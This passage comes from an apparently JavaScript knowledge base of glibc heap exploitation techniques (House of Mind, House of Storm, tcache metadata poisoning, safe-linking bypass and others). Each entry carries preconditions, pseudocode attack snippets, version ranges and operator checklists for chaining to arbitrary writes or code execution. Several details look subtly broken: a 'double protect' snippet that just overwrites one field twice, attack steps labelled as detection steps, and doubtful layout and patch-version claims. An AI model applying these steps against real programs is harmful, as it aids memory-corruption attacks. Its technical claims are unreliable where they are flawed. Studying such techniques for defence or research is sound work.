          { description: 'How2Heap: fastbin_reverse_into_tcache', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_reverse_into_tcache.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with heap pointer', 'Can be chained with GOT overwrite or FSOP'],
      artifacts: ['GDB: corrupted fastbin chunk visible in bins']
    },

    operatorChecklist: [
      '[ ] Fill tcache for target size (7 entries)',
      '[ ] Free chunk to fastbin',
      '[ ] Corrupt fastbin chunk fd/bk pointers',
      '[ ] Trigger consolidation via large malloc',
      '[ ] Verify arbitrary write occurred',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'fastbin', 'tcache'],
    references: [
      { description: 'How2Heap: fastbin_reverse_into_tcache', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_reverse_into_tcache.c' }
    ]
  },

  house_of_mind_fastbin: {
    id: 'house_of_mind_fastbin',
    name: 'House of Mind (Fastbin)',
    category: 'technique',
    class: 'house',
    description: 'Exploits a single byte overwrite with arena handling to write a large value (heap pointer) to an arbitrary address. By corrupting the arena index in a chunk header, the allocator uses a fake arena structure to perform the free operation, enabling arbitrary writes.',

    preconditions: {
      summary: 'A single byte overwrite (or small overflow) that can corrupt the arena index in a chunk header, combined with the ability to place a fake arena structure.',
      required: [
        'Single byte overwrite or small overflow on a chunk header',
        'Ability to place a fake arena structure in memory',
        'The fake arena must have valid bins (fastbin pointers)',
        'Glibc < 2.43 (patched with arena index validation)'
      ],
      detectionSteps: [
        'Identify the arena index byte in the chunk header (bits 13-16 of the size field)',
        'Place a fake arena structure at the calculated offset from the corrupted index',
        'The fake arena fastbins must point to attacker-controlled addresses',
        'Free the chunk: allocator uses fake arena and writes to arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Arena Index Corruption to Arbitrary Write',
        description: 'Corrupt the arena index byte to redirect free() to a fake arena with controlled fastbins.',
        steps: [
          'Identify the arena index in the chunk size field (bits 13-16)',
          'Place a fake arena structure at: main_arena + (corrupted_index - 1) * sizeof(arena)',
          'Set the fake arena fastbin pointers to target addresses',
          'Free the chunk with corrupted arena index',
          'Allocator uses fake arena: fastbin->fd = chunk',
          'Result: arbitrary address receives a heap pointer'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `# Fake arena structure
# Place at calculated offset from main_arena
fake_arena = main_arena + (fake_index - 1) * 0x1000

# Set fake arena fastbin to target
*(uint64_t*)(fake_arena + fastbin_offset) = target_addr - 0x10

# Corrupt chunk arena index byte
*(uint8_t*)(chunk + 0x8) = fake_index_byte

# Free uses fake arena
free(chunk)
# target_addr now contains heap pointer`,
        applicableLibc: '< 2.43',
        references: [
          { description: 'How2Heap: house_of_mind_fastbin', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with heap pointer', 'Fake arena structure used by allocator'],
      artifacts: ['GDB: fake arena visible in memory map']
    },

    operatorChecklist: [
      '[ ] Identify arena index byte in chunk header',
      '[ ] Calculate fake arena address from corrupted index',
      '[ ] Place fake arena structure in memory',
      '[ ] Set fake arena fastbin pointers to target addresses',
      '[ ] Corrupt chunk arena index byte',
      '[ ] Free chunk: allocator uses fake arena',
      '[ ] Verify arbitrary write occurred'
    ],

    vulnerabilityTypes: ['heap', 'house', 'fastbin'],
    references: [
      { description: 'How2Heap: house_of_mind_fastbin', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c' }
    ]
  },

  house_of_storm: {
    id: 'house_of_storm',
    name: 'House of Storm',
    category: 'technique',
    class: 'house',
    description: 'Exploits a use-after-free on both a large bin and unsorted bin chunk to return an arbitrary chunk from malloc. By corrupting both bin linked lists simultaneously, the allocator returns a chunk at an attacker-controlled address.',

    preconditions: {
      summary: 'A UAF that allows corrupting both a large bin chunk and an unsorted bin chunk simultaneously.',
      required: [
        'UAF on both a large bin chunk and an unsorted bin chunk',
        'Ability to corrupt fd_nextsize, bk_nextsize of large bin chunk',
        'Ability to corrupt fd, bk of unsorted bin chunk',
        'Glibc < 2.29 (patched with additional integrity checks)'
      ],
      detectionSteps: [
        'Free chunks into both large bin and unsorted bin',
        'Corrupt large bin chunk fd_nextsize and bk_nextsize',
        'Corrupt unsorted bin chunk fd and bk',
        'Trigger malloc: allocator traverses both bins and returns arbitrary chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Large Bin + Unsorted Bin Corruption to Arbitrary Chunk',
        description: 'Corrupt both large bin and unsorted bin linked lists to make malloc return an arbitrary chunk.',
        steps: [
          'Free chunk A into unsorted bin',
          'Free chunk B into large bin (larger than A)',
          'Overflow to corrupt B fd_nextsize and bk_nextsize',
          'Overflow to corrupt A fd and bk',
          'Call malloc(size): allocator checks large bin first, then unsorted bin',
          'Corrupted pointers cause allocator to return chunk at arbitrary address'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Setup bins
a = malloc(0x400)  # unsorted bin size
b = malloc(0x500)  # large bin size
free(a)  # unsorted bin
free(b)  # large bin

# Corrupt large bin chunk
*(uint64_t*)(b + 0x20) = target_addr - 0x20  # fd_nextsize
*(uint64_t*)(b + 0x28) = target_addr - 0x10  # bk_nextsize

# Corrupt unsorted bin chunk
*(uint64_t*)(a + 0x10) = target_addr - 0x18  # fd
*(uint64_t*)(a + 0x18) = target_addr - 0x10  # bk

# Get arbitrary chunk
p = malloc(0x400)  # p points to target_addr!`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: house_of_storm', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns chunk at attacker-controlled address', 'Both large bin and unsorted bin corrupted'],
      artifacts: ['GDB: corrupted large bin and unsorted bin visible in bins']
    },

    operatorChecklist: [
      '[ ] Free chunks into both large bin and unsorted bin',
      '[ ] Corrupt large bin fd_nextsize and bk_nextsize',
      '[ ] Corrupt unsorted bin fd and bk',
      '[ ] Trigger malloc to get arbitrary chunk',
      '[ ] Note: patched in glibc 2.29+'
    ],

    vulnerabilityTypes: ['heap', 'house', 'large-bin', 'unsorted-bin'],
    references: [
      { description: 'How2Heap: house_of_storm', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c' }
    ]
  },

  house_of_gods: {
    id: 'house_of_gods',
    name: 'House of Gods',
    category: 'technique',
    class: 'house',
    description: 'A technique to hijack a thread arena within 8 allocations. By corrupting the arena list and forcing the allocator to use a fake arena, an attacker can control malloc/free behavior for a thread.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the arena list or thread arena pointer.',
      required: [
        'Heap overflow or UAF on a chunk near the arena structure',
        'Ability to place a fake arena structure',
        'Glibc < 2.27 (patched with arena list validation)'
      ],
      detectionSteps: [
        'Identify the thread arena pointer in TLS',
        'Corrupt the arena pointer to point to fake arena',
        'Place fake arena with controlled bins',
        'Subsequent malloc/free uses fake arena'
      ]
    },

    exploitationPaths: [
      {
        name: 'Thread Arena Hijack via Fake Arena',
        description: 'Corrupt the thread arena pointer to redirect malloc/free to a fake arena.',
        steps: [
          'Identify thread arena pointer location (TLS)',
          'Corrupt arena pointer to point to fake arena structure',
          'Place fake arena with controlled fastbin/unsorted bin pointers',
          'Subsequent malloc uses fake arena bins',
          'Free operations write to attacker-controlled addresses'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Corrupt thread arena pointer
# Located in TLS at fs:0x10 (x86_64)
*(uint64_t*)(tls_arena_ptr) = fake_arena_addr

# Fake arena with controlled bins
*(uint64_t*)(fake_arena + fastbin_offset) = target_addr

# malloc uses fake arena
p = malloc(0x60)  # returns from fake arena fastbin`,
        applicableLibc: '< 2.27',
        references: [
          { description: 'How2Heap: house_of_gods', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Thread uses fake arena for malloc/free', 'Arbitrary writes via fake arena bins'],
      artifacts: ['GDB: thread arena pointer corrupted']
    },

    operatorChecklist: [
      '[ ] Identify thread arena pointer in TLS',
      '[ ] Place fake arena structure in memory',
      '[ ] Corrupt arena pointer to fake arena',
      '[ ] Set fake arena bins to target addresses',
      '[ ] Trigger malloc/free to use fake arena',
      '[ ] Note: patched in glibc 2.27+'
    ],

    vulnerabilityTypes: ['heap', 'house', 'arena'],
    references: [
      { description: 'How2Heap: house_of_gods', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c' }
    ]
  },

  decrypt_safe_linking: {
    id: 'decrypt_safe_linking',
    name: 'Decrypt Safe Linking',
    category: 'technique',
    class: 'heap-technique',
    description: 'Decrypts the poisoned value in a tcache/fastbin linked list to recover the actual pointer. Safe linking (glibc 2.32+) XORs the fd pointer with a shifted version of the chunk address to prevent straightforward pointer overwrites.',

    preconditions: {
      summary: 'A heap leak that reveals the fd pointer of a freed chunk, combined with knowledge of the chunk address to reverse the safe linking XOR.',
      required: [
        'Heap leak revealing the poisoned fd pointer',
        'Knowledge of the chunk address (from leak or calculation)',
        'Glibc >= 2.32 (safe linking era)',
        'Ability to read the poisoned fd value'
      ],
      detectionSteps: [
        'Leak the poisoned fd pointer from a freed chunk',
        'Calculate the chunk address (from leak or heap base)',
        'Apply reverse XOR: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
        'Verify the decrypted fd points to a valid heap address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Safe Linking Decryption to Recover Pointers',
        description: 'Reverse the safe linking XOR to recover actual fd pointers for exploitation.',
        steps: [
          'Leak the poisoned fd pointer from a freed chunk',
          'Calculate chunk address: chunk_addr = leaked_chunk_address',
          'Decrypt: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
          'Use actual_fd to map the heap layout',
          'For exploitation: to corrupt fd, calculate poisoned_value = target XOR (chunk_addr >> 12)'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Safe linking decryption
# glibc 2.32+: fd is XORed with (chunk_addr >> 12)

# Leak poisoned fd
poisoned_fd = leak_from_heap(chunk_addr + 0x10)

# Decrypt to get actual fd
actual_fd = poisoned_fd ^ (chunk_addr >> 12)

# To corrupt fd for tcache poisoning:
# poisoned_value = target_addr ^ (chunk_addr >> 12)
*(uint64_t*)(chunk_addr + 0x10) = target_addr ^ (chunk_addr >> 12)`,
        applicableLibc: '>= 2.32',
        references: [
          { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Actual fd pointer recovered from poisoned value', 'Can now corrupt fd for tcache poisoning with correct XOR'],
      artifacts: ['GDB: decrypted fd points to valid heap address']
    },

    operatorChecklist: [
      '[ ] Leak poisoned fd pointer from freed chunk',
      '[ ] Calculate chunk address',
      '[ ] Decrypt: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
      '[ ] Verify decrypted fd is valid',
      '[ ] For exploitation: calculate poisoned_value = target XOR (chunk_addr >> 12)',
      '[ ] Write poisoned_value to corrupt fd'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'safe-linking'],
    references: [
      { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
    ]
  },

  tcache_metadata_poisoning: {
    id: 'tcache_metadata_poisoning',
    name: 'Tcache Metadata Poisoning',
    category: 'technique',
    class: 'heap-technique',
    description: 'Tricks the tcache into providing arbitrary pointers by manipulating the tcache metadata struct (tcache_perthread_struct). By overwriting the counts and entries arrays, an attacker can make malloc return any address without corrupting individual chunk fd pointers.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows writing to the tcache_perthread_struct.',
      required: [
        'Heap overflow or UAF reaching the tcache_perthread_struct',
        'The struct is located at heap_base + 0x10 (after main arena)',
        'Ability to overwrite counts[N] and entries[N] arrays',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Locate tcache_perthread_struct on the heap',
        'Identify the size index for target allocation size',
        'Overwrite entries[size_index] with target address',
        'Set counts[size_index] to non-zero value',
        'malloc returns target address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Struct Corruption to Arbitrary Allocation',
        description: 'Directly corrupt the tcache metadata struct to insert arbitrary addresses.',
        steps: [
          'Locate tcache_perthread_struct (heap_base + 0x10)',
          'Calculate size_index = target_size >> 4',
          'Overwrite entries[size_index] = target_address',
          'Set counts[size_index] = 1 (or higher)',
          'malloc(target_size) returns target_address directly',
          'No chunk corruption needed: direct metadata manipulation'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Tcache metadata struct layout:
# counts[64] (64 bytes) + entries[64] (512 bytes)
# Total: 576 bytes

tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4  # for 0x60 size

# Direct metadata manipulation
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

p = malloc(0x60)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: tcache_metadata_poisoning', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_metadata_poisoning.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via metadata corruption', 'No individual chunk corruption needed'],
      artifacts: ['GDB: tcache_perthread_struct with corrupted entries']
    },

    operatorChecklist: [
      '[ ] Locate tcache_perthread_struct',
      '[ ] Calculate size_index for target size',
      '[ ] Overwrite entries[size_index] = target_address',
      '[ ] Set counts[size_index] = 1',
      '[ ] malloc returns target address',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'metadata'],
    references: [
      { description: 'How2Heap: tcache_metadata_poisoning', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_metadata_poisoning.c' }
    ]
  },

  house_of_io: {
    id: 'house_of_io',
    name: 'House of IO',
    category: 'technique',
    class: 'house',
    description: 'Tricks malloc into returning a pointer to arbitrary memory by manipulating the tcache management struct via UAF in a freed tcache chunk. Combines tcache metadata corruption with the tcache_perthread_struct to achieve arbitrary allocation.',

    preconditions: {
      summary: 'A UAF on a tcache chunk that allows overwriting the tcache_perthread_struct entries.',
      required: [
        'UAF on a tcache-sized chunk',
        'Ability to write to tcache_perthread_struct via the dangling pointer',
        'Glibc 2.31-2.33'
      ],
      detectionSteps: [
        'Free chunk to tcache',
        'Use UAF to overwrite tcache metadata',
        'Set entries[size_index] = target_address',
        'malloc returns target address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache UAF to Arbitrary Pointer',
        description: 'Use UAF on a tcache chunk to corrupt the tcache metadata and get arbitrary allocation.',
        steps: [
          'Free chunk to tcache',
          'Use UAF to overwrite tcache_perthread_struct',
          'Set entries[size_index] = target_address',
          'malloc returns target address from corrupted tcache'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# UAF on tcache chunk
p = malloc(0x60)
free(p)  # p in tcache

# UAF: overwrite tcache metadata via dangling p
tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4

*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

q = malloc(0x60)  # q == target_addr!`,
        applicableLibc: '2.31-2.33',
        references: [
          { description: 'How2Heap: house_of_io', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_io.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via tcache UAF', 'Tcache metadata corrupted'],
      artifacts: ['GDB: corrupted tcache entries visible']
    },

    operatorChecklist: [
      '[ ] Confirm glibc version 2.31-2.33 for House of IO applicability',
      '[ ] Free chunk to tcache and obtain dangling pointer (UAF)',
      '[ ] Locate tcache_perthread_struct address via heap base offset',
      '[ ] Use UAF to overwrite tcache metadata via the dangling pointer',
      '[ ] Set entries[size_index] = target_address for arbitrary allocation',
      '[ ] Set counts[size_index] to appropriate non-zero value',
      '[ ] Verify corrupted tcache entry: pwndbg bins, tcache',
      '[ ] malloc(target_size) returns the arbitrary address',
      '[ ] Chain with second-stage technique for code execution',
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'uaf'],
    references: [
      { description: 'How2Heap: house_of_io', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_io.c' }
    ]
  },

  tcache_relative_write: {
    id: 'tcache_relative_write',
    name: 'Tcache Relative Write',
    category: 'technique',
    class: 'heap-technique',
    description: 'Arbitrary decimal value and chunk pointer writing in the heap by out-of-bounds tcache metadata writing. By overflowing into the tcache counts array, an attacker can manipulate the count values to control tcache behavior and achieve arbitrary writes.',

    preconditions: {
      summary: 'A heap overflow that reaches the tcache_perthread_struct counts array.',
      required: [
        'Heap overflow reaching tcache metadata',
        'Ability to overwrite counts[size_index] values',
        'Glibc 2.30-2.41 (patched in 2.42+)'
      ],
      detectionSteps: [
        'Identify tcache_perthread_struct location',
        'Overflow into counts array',
        'Manipulate count values to control tcache behavior',
        'Trigger malloc to get arbitrary allocation'
      ]
    },

    exploitationPaths: [
      {
        name: 'OOB Tcache Count Write to Arbitrary Allocation',
        description: 'Overflow into tcache counts to manipulate allocation behavior.',
        steps: [
          'Overflow into tcache counts array',
          'Set counts[size_index] to desired value',
          'This controls how many chunks tcache thinks it has',
          'Combined with fd corruption, achieves arbitrary allocation'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into tcache counts
# counts array starts at tcache_struct
*(uint8_t*)(tcache_struct + size_index) = 7  # fake count

# Now tcache thinks it has 7 chunks
# Combined with fd corruption = arbitrary alloc`,
        applicableLibc: '2.30-2.41',
        references: [
          { description: 'How2Heap: tcache_relative_write', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_relative_write.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Tcache counts manipulated', 'Arbitrary allocation achieved'],
      artifacts: ['GDB: corrupted tcache counts']
    },

    operatorChecklist: [
      '[ ] Identify tcache_perthread_struct location in heap arena',
      '[ ] Calculate size_index for the target allocation size class',
      '[ ] Overflow into counts array to manipulate tcache behavior',
      '[ ] Set counts to desired values (non-zero = entries available)',
      '[ ] Combine with fd pointer corruption for full arbitrary allocation',
      '[ ] Verify overflow reaches tcache metadata: pwndbg tcache',
      '[ ] Check glibc version: patched in glibc 2.42+ (alternative: tcache_metadata_hijacking)',
      '[ ] Chain with second-stage exploitation technique',
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
    references: [
      { description: 'How2Heap: tcache_relative_write', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_relative_write.c' }
    ]
  },

  tcache_metadata_hijacking: {
    id: 'tcache_metadata_hijacking',
    name: 'Tcache Metadata Hijacking',
    category: 'technique',
    class: 'heap-technique',
    description: 'Arbitrary allocation by overflow into tcache metadata. The latest technique (glibc >= 2.42) that exploits the tcache metadata structure to achieve arbitrary allocation even with modern hardening.',

    preconditions: {
      summary: 'A heap overflow that reaches the tcache metadata structure in glibc 2.42+.',
      required: [
        'Heap overflow reaching tcache metadata',
        'Glibc >= 2.42',
        'Ability to overwrite tcache entries and counts'
      ],
      detectionSteps: [
        'Identify tcache metadata layout in glibc 2.42+',
        'Overflow into metadata',
        'Corrupt entries and counts',
        'malloc returns arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Metadata Overflow to Arbitrary Allocation',
        description: 'Overflow into tcache metadata to achieve arbitrary allocation in modern glibc.',
        steps: [
          'Overflow into tcache metadata',
          'Corrupt entries[size_index] = target_address',
          'Set counts[size_index] to non-zero',
          'malloc returns target address'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into tcache metadata (glibc 2.42+)
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

p = malloc(target_size)  # p == target_addr!`,
        applicableLibc: '>= 2.42',
        references: [
          { description: 'How2Heap: tcache_metadata_hijacking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.42/tcache_metadata_hijacking.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address', 'Tcache metadata corrupted'],
      artifacts: ['GDB: corrupted tcache metadata']
    },

    operatorChecklist: [
      '[ ] Identify tcache metadata location in glibc 2.42+',
      '[ ] Calculate size_index for the target allocation size',
      '[ ] Overflow or write into tcache_perthread_struct entries/counts arrays',
      '[ ] Set entries[size_index] = target_address for arbitrary allocation',
      '[ ] Set counts[size_index] to appropriate value (>0 for malloc to follow)',
      '[ ] Verify corrupted metadata in GDB: pwndbg bins, tcache bins',
      '[ ] malloc(target_size) returns the target address',
      '[ ] Chain with second-stage technique (write to __free_hook, GOT, FSOP)',
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
    references: [
      { description: 'How2Heap: tcache_metadata_hijacking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.42/tcache_metadata_hijacking.c' }
    ]
  },

  fastbin_dup_consolidate: {
    id: 'fastbin_dup_consolidate',
    name: 'Fastbin Dup Consolidate',
    category: 'technique',
    class: 'heap-technique',
    description: 'Tricks malloc into returning an already-allocated heap pointer by putting a pointer on both the fastbin freelist and the top chunk. When malloc_consolidate is triggered, the fastbin chunk is moved to the unsorted bin, but the top chunk still has a reference to it.',

    preconditions: {
      summary: 'A double-free that allows a chunk to be in both the fastbin and the top chunk simultaneously.',
      required: [
        'Double-free vulnerability',
        'Ability to trigger malloc_consolidate (large malloc)',
        'Glibc < 2.43 (patched with additional checks)'
      ],
      detectionSteps: [
        'Double-free a chunk',
        'Trigger malloc_consolidate with large malloc',
        'Fastbin chunk moves to unsorted bin',
        'Top chunk still references the same memory',
        'Next allocation returns overlapping chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Double Free + Consolidate to Overlapping Chunks',
        description: 'Use double-free and consolidation to create overlapping allocations.',
        steps: [
          'Allocate chunk A',
          'Free A (goes to fastbin)',
          'Free A again (double-free, still in fastbin)',
          'Trigger malloc_consolidate with large malloc',
          'A moves from fastbin to unsorted bin',
          'Next allocation returns A from unsorted bin',
          'But A is also still in fastbin: overlapping chunks!'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Double free
a = malloc(0x60)
free(a)  # fastbin
free(a)  # double-free!

# Trigger consolidation
malloc(0x400)  # large malloc

# Now a is in unsorted bin AND fastbin
# Next allocation from fastbin returns a again
b = malloc(0x60)  # b == a (overlapping!)`,
        applicableLibc: '< 2.43',
        references: [
          { description: 'How2Heap: fastbin_dup_consolidate', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_consolidate.c' },
          { description: 'Hitcon 2016: SleepyHolder', url: 'https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Overlapping chunks achieved', 'Same memory referenced by two pointers'],
      artifacts: ['GDB: chunk visible in both fastbin and unsorted bin']
    },

    operatorChecklist: [
      '[ ] Double-free a chunk',
      '[ ] Trigger malloc_consolidate',
      '[ ] Verify chunk in both fastbin and unsorted bin',
      '[ ] Allocate to get overlapping chunk',
      '[ ] Use overlap for arbitrary read/write'
    ],

    vulnerabilityTypes: ['heap', 'fastbin', 'double-free'],
    references: [
      { description: 'How2Heap: fastbin_dup_consolidate', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_consolidate.c' },
      { description: 'Hitcon 2016: SleepyHolder', url: 'https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder' }
    ]
  },

  mmap_overlapping_chunks: {
    id: 'mmap_overlapping_chunks',
    name: 'Mmap Overlapping Chunks',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an in-use mmap chunk to make a new allocation overlap with a current mmap chunk. By corrupting the size of an mmap chunk, subsequent allocations can overlap with the mmap region.',

    preconditions: {
      summary: 'A heap overflow that can corrupt the size field of an mmap chunk.',
      required: [
        'Heap overflow reaching mmap chunk size field',
        'Mmap chunk allocated (size > mmap_threshold)',
        'Ability to corrupt the mmap chunk size'
      ],
      detectionSteps: [
        'Allocate mmap chunk (large malloc)',
        'Overflow into mmap chunk size field',
        'Corrupt size to include adjacent memory',
        'Next allocation overlaps with mmap chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Mmap Chunk Corruption to Overlapping Allocation',
        description: 'Corrupt mmap chunk size to cause overlapping allocations.',
        steps: [
          'Allocate mmap chunk (large malloc)',
          'Overflow into mmap chunk size field',
          'Set size to include adjacent memory',
          'Free mmap chunk',
          'Next allocation overlaps with mmap region'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `# Mmap chunk
a = malloc(0x20000)  # mmap chunk
b = malloc(0x100)    # adjacent chunk

# Overflow a into b or corrupt a size
*(uint64_t*)(a + 0x8) = 0x20100  # corrupted size

# Free and reallocate
free(a)
c = malloc(0x20000)  # overlaps with b!`,
        applicableLibc: 'All versions',
        references: [
          { description: 'How2Heap: mmap_overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/mmap_overlapping_chunks.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['New allocation overlaps with mmap region', 'Arbitrary read/write via overlap'],
      artifacts: ['GDB: overlapping mmap chunks visible']
    },

    operatorChecklist: [
      '[ ] Allocate mmap chunk',
      '[ ] Overflow into mmap chunk size',
      '[ ] Corrupt size to include adjacent memory',
      '[ ] Free and reallocate',
      '[ ] Use overlap for exploitation'
    ],

    vulnerabilityTypes: ['heap', 'mmap', 'overflow'],
    references: [
      { description: 'How2Heap: mmap_overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/mmap_overlapping_chunks.c' }
    ]
  },

  sysmalloc_int_free: {
    id: 'sysmalloc_int_free',
    name: 'Sysmalloc Int Free',
    category: 'technique',
    class: 'heap-technique',
    description: 'Demonstrates freeing the nearly arbitrary sized Top Chunk (Wilderness) using malloc via sysmalloc internal free. When sysmalloc is triggered, it may call _int_free on the old top chunk, enabling exploitation of the top chunk as if it were a regular freed chunk.',

    preconditions: {
      summary: 'An overflow into the top chunk that can trigger sysmalloc and cause the old top chunk to be freed.',
      required: [
        'Heap overflow reaching top chunk',
        'Ability to trigger sysmalloc (large malloc)',
        'Top chunk size can be corrupted'
      ],
      detectionSteps: [
        'Overflow into top chunk size',
        'Trigger sysmalloc with large malloc',
        'Old top chunk freed via _int_free',
        'Freed top chunk enters appropriate bin'
      ]
    },

    exploitationPaths: [
      {
        name: 'Sysmalloc Top Chunk Free to Bin Placement',
        description: 'Trigger sysmalloc to free the top chunk into a bin for exploitation.',
        steps: [
          'Overflow into top chunk size field',
          'Corrupt top chunk size',
          'Trigger sysmalloc with large malloc',
          'Old top chunk freed via _int_free',
          'Freed chunk enters unsorted/large bin',
          'Exploit the freed chunk via standard bin techniques'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into top chunk
*(uint64_t*)(top_chunk + 0x8) = corrupted_size

# Trigger sysmalloc
malloc(0x10000)  # large malloc

# Old top chunk freed
# Now exploitable via bin techniques`,
        applicableLibc: 'All versions',
        references: [
          { description: 'How2Heap: sysmalloc_int_free', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/sysmalloc_int_free.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Top chunk freed into bin', 'Standard bin exploitation applicable'],
      artifacts: ['GDB: freed top chunk visible in bins']
    },

    operatorChecklist: [
      '[ ] Overflow into top chunk',
      '[ ] Corrupt top chunk size',
      '[ ] Trigger sysmalloc',
      '[ ] Verify top chunk freed into bin',
      '[ ] Apply standard bin exploitation'
    ],

    vulnerabilityTypes: ['heap', 'top-chunk', 'sysmalloc'],
    references: [
      { description: 'How2Heap: sysmalloc_int_free', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/sysmalloc_int_free.c' }
    ]
  },

  safe_link_double_protect: {
    id: 'safe_link_double_protect',
    name: 'Safe Link Double Protect',
    category: 'technique',
    class: 'heap-technique',
    description: 'Leakless bypass for PROTECT_PTR by protecting a pointer twice, allowing for arbitrary pointer linking in tcache. By XORing a pointer twice with different values, the safe linking protection can be bypassed without leaks.',

    preconditions: {
      summary: 'A UAF or overflow that allows writing to a tcache chunk fd pointer twice with different XOR values.',
      required: [
        'UAF or overflow on tcache chunk',
        'Ability to write to fd pointer twice',
        'Glibc >= 2.32 (PROTECT_PTR era)'
      ],
      detectionSteps: [
        'Identify PROTECT_PTR mechanism',
        'Write fd pointer with first XOR value',
        'Write again with second XOR value',
        'Result: arbitrary pointer in tcache'
      ]
    },

    exploitationPaths: [
      {
        name: 'Double XOR Bypass of PROTECT_PTR',
        description: 'Bypass safe linking by writing fd pointer twice with different XOR values.',
        steps: [
          'Identify PROTECT_PTR: fd XORed with (chunk_addr >> 12)',
          'Write fd with first value',
          'Write again with second value to cancel XOR',
          'Result: arbitrary pointer in tcache fd',
          'malloc returns arbitrary address'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Double protect bypass
# Write fd twice to cancel XOR protection
*(uint64_t*)(chunk + 0x10) = value1
*(uint64_t*)(chunk + 0x10) = value2
# Result: arbitrary fd in tcache`,
        applicableLibc: '>= 2.32',
        references: [
